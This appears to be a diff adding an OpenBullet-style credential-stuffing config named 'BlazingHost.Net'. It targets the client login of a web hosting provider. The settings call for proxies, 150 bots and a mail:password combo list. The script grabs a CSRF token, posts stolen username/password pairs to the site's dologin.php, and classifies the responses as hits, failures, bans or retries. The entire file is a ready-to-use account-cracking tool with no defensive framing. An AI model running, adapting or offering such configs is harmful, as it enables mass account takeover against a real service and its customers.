@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "BlazingHost.Net",
+  "SuggestedBots": 150,
+  "LastModified": "2018-07-04T23:39:16.7374113+00:00",
+  "AdditionalInfo": "",
+  "Author": "MaStErChO",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Getting_Cookies REQUEST GET "https://clients.blazinhosting.net/clientarea.php" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#TOKEN PARSE "<SOURCE>" REGEX "csrfToken = '([^']*)" "[1]" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#Checking REQUEST POST "https://clients.blazinhosting.net/dologin.php" AutoRedirect=TRUE 
+  CONTENT "token=<TOKEN>&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY ">Logout<" 
+    KEY "Welcome Back," 
+  KEYCHAIN Failure OR 
+    KEY "Login Details Incorrect. Please try again" 
+  KEYCHAIN Ban OR 
+    KEY "Web server is returning an unknown error" 
+  KEYCHAIN Retry OR 
+    KEY "Something went wrong and we couldn't process your request" 
+    KEY "<SOURCE>" EqualTo "" 
